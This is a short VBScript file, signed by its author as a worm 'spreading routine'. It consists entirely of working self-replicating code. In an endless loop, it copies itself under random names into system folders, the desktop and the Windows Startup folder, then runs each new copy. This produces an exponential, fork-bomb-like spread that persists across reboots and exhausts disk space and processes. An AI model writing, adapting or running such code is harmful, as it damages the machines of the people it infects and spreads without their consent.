' Vbs Spreading routine!
' By Soad2K
 ' A more complex spreading routine
  ' It copies itself in random folder's with random numbers :P
Randomize
Do
a = int(rnd(1) * 6) + 1
Select Case a
Case 1
b = "C:\"
Case 2
b = "C:\progra~1\"
Case 3
b = "C:\docume~1\"
Case 4
b = "C:\DOCUME~1\ALLUSE~1\Desktop\"
Case 5
b = "C:\DOCUME~1\ALLUSE~1\STARTM~1\"
Case 6
b = "C:\DOCUME~1\ALLUSE~1\STARTM~1\Programs\Startup"
End Select
c = rnd*rnd*a*a*rnd(1238218)*rnd(a)*a*a*a*rnd*999999
c = replace(c, ".", "")
d = b+c+".vbs"
Set fs = createobject("scripting.filesystemobject")
Set st = createobject("wscript.shell")
fs.CopyFile Wscript.ScriptFullName, d
st.run d
wscript.sleep 1000
Loop

